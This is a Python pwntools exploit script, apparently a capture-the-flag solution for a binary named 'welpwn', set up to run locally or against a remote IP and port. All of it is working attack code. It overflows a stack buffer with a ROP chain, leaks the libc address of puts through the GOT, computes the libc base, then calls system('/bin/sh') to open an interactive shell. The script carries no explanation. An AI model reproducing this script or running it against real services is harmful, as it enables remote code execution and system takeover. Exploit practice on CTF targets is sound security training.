#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal <edit py/.vimrc to change me>

from pwn import *
context.log_level="debug"
pwn_file="./welpwn"
elf=ELF(pwn_file)
libc=ELF("./libc-2.23.so")
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("111.198.29.45", 41230)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

debug()

main = 0x00000000004007CD
pop3 = 0x000000000040089e
pop4 = 0x000000000040089c
pop_rdi = 0x00000000004008a3


sh = 'a'*0x18 + p64(pop3) + 'a'*0x18
sh += p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(main)

r.send(sh)
r.recvuntil("@")
a = u64(r.recv(6) + '\x00'*2) - libc.sym['puts']
libc.address = a
info("libc: "+hex(a))

sh = 'a'*0x18 + p64(pop3) + 'a'*0x18
sh += p64(pop_rdi) + p64(libc.search("/bin/sh").next()) + p64(libc.sym['system'])

r.recv()
r.send(sh)

r.interactive()
